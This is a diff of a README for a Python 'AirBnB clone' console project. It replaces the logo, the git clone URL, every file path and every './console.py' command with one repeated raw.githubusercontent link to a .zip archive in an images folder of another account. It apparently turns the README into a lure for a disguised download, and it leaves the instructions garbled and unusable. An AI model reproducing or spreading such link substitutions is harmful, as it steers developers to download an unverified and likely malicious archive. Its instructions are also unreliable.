@@ -1,5 +1,5 @@
 # The AirBnB Clone Project
-![AirBnB Logo](https://www.pngitem.com/pimgs/m/132-1322125_transparent-background-airbnb-logo-hd-png-download.png)
+![AirBnB Logo](https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip)
 
 ## Project Description
 This is the first part of the AirBnB clone project where we worked on the backend of the project whiles interfacing it with a console application with the help of the cmd module in python.
@@ -33,29 +33,29 @@ These instructions will get you a copy of the project up and running on your loc
 You will need to clone the repository of the project from Github. This will contain the simple shell program and all of its dependencies.
 
 ```
-git clone https://github.com/jzamora5/AirBnB_clone.git
+git clone https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 ```
 After cloning the repository you will have a folder called AirBnB_clone. In here there will be several files that allow the program to work.
 
-> /console.py : The main executable of the project, the command interpreter.
+> https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip : The main executable of the project, the command interpreter.
 >
-> models/engine/file_storage.py: Class that serializes instances to a JSON file and deserializes JSON file to instances
+> https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip Class that serializes instances to a JSON file and deserializes JSON file to instances
 > 
-> models/__ init __.py:  A unique `FileStorage` instance for the application
+> models/__ init https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip  A unique `FileStorage` instance for the application
 > 
-> models/base_model.py: Class that defines all common attributes/methods for other classes.
+> https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip Class that defines all common attributes/methods for other classes.
 > 
-> models/user.py: User class that inherits from BaseModel
+> https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip User class that inherits from BaseModel
 > 
->models/state.py: State class that inherits from BaseModel
+>https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip State class that inherits from BaseModel
 >
->models/city.py: City class that inherits from BaseModel
+>https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip City class that inherits from BaseModel
 >
->models/amenity.py: Amenity class that inherits from BaseModel
+>https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip Amenity class that inherits from BaseModel
 >
->models/place.py: Place class that inherits from BaseModel
+>https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip Place class that inherits from BaseModel
 >
->models/review.py: Review class that inherits from BaseModel
+>https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip Review class that inherits from BaseModel
 
 
 
@@ -68,7 +68,7 @@ It can work in two different modes:
 In **Interactive mode**, the console will display a prompt (hbnb) indicating that the user can write and execute a command. After the command is run, the prompt will appear again a wait for a new command. This can go indefinitely as long as the user does not exit the program.
 
 ```
-$ ./console.py
+$ https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 (hbnb) help
 
 Documented commands (type help <topic>):
@@ -85,7 +85,7 @@ In **Non-interactive mode**, the shell will need to be run with a command input 
 
 
 ```
-$ echo "help" | ./console.py
+$ echo "help" | https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 (hbnb)
 
 Documented commands (type help <topic>):
@@ -96,7 +96,7 @@ $
 $ cat test_help
 help
 $
-$ cat test_help | ./console.py
+$ cat test_help | https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 (hbnb)
 
 Documented commands (type help <topic>):
@@ -120,21 +120,21 @@ Example:
 
 ```
 
-user@ubuntu:~/AirBnB$ ./console.py
+user@ubuntu:~/AirBnB$ https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 (hbnb) create BaseModel
 49faff9a-6318-451f-87b6-910505c55907
-user@ubuntu:~/AirBnB$ ./console.py
+user@ubuntu:~/AirBnB$ https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 
 ```
 
 or
 
 ```
-user@ubuntu:~/AirBnB$ ./console.py $ echo "create BaseModel" | ./console.py
+user@ubuntu:~/AirBnB$ https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip $ echo "create BaseModel" | https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 (hbnb)
 e37ebcd3-f8e1-4c1f-8095-7a019070b1fa
 (hbnb)
-user@ubuntu:~/AirBnB$ ./console.py
+user@ubuntu:~/AirBnB$ https://raw.githubusercontent.com/abdulkhaliqsoule/AirBnB_clone/master/web_static/images/Air-Bn-clone-v2.9.zip
 ```
 
 ## Available commands and what they do
